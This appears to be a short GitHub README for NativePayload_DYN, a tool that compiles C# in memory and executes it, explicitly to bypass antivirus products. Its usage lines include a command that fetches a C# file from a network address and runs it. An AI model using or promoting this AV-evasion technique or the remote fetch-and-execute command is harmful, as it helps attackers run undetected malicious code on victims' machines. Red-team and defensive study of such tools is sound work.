# NativePayload_DYN

### Compiling Csharp in-memory and Execute to bypass AVs

#### Note: Code created by me in [Jun 2017] and Published in [Mar 2023] ;D but still can help you to bypass some AVs ;)

#### Note: ALL AVs in 2017 Bypassed by this simple code but for now i am not sure for this. 

<p><a href="https://hits.seeyoufarm.com"><img src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https://github.com/DamonMohammadbagher/NativePayload_DYN"/></a></p>

usage:
      
    NativePayload_DYN.exe -f "class1.cs"
    NativePayload_DYN.exe -w "http://192.168.56.10/class1.cs"
